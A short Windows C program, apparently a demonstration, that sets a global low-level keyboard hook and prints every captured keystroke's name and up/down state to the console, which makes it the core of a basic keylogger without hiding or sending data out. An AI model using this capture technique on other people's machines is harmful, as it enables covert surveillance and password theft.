#include <Windows.h>
#include <stdio.h>

LRESULT CALLBACK KeyboardHook(int nCode, WPARAM wParam, LPARAM lParam)
{
	KBDLLHOOKSTRUCT kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
	int msg = 1 + (kbdStruct.scanCode << 16) + (kbdStruct.flags << 24);
	char keyName[64];
	GetKeyNameTextA(msg, keyName, 64);
	char keyState[16];
	switch (wParam)
	{
	case WM_KEYUP:
	strncpy(keyState, "Key Up\0", 16);
		break;
	case WM_KEYDOWN:
	strncpy(keyState, "Key Down\0", 16);
		break;
	case WM_SYSKEYUP:
	strncpy(keyState, "Sys Key Up\0", 16);
		break;
	case WM_SYSKEYDOWN:
	strncpy(keyState, "Sys Key Down\0", 16);
		break;
	}
	printf("Captured: %s \t %s\n", keyName, keyState);
	return CallNextHookEx(0, nCode, wParam, lParam);;
}

int main()
{
	SetWindowsHookExA(WH_KEYBOARD_LL, KeyboardHook, NULL, 0);
	while (GetMessageA(0, 0, 0, 0));
}
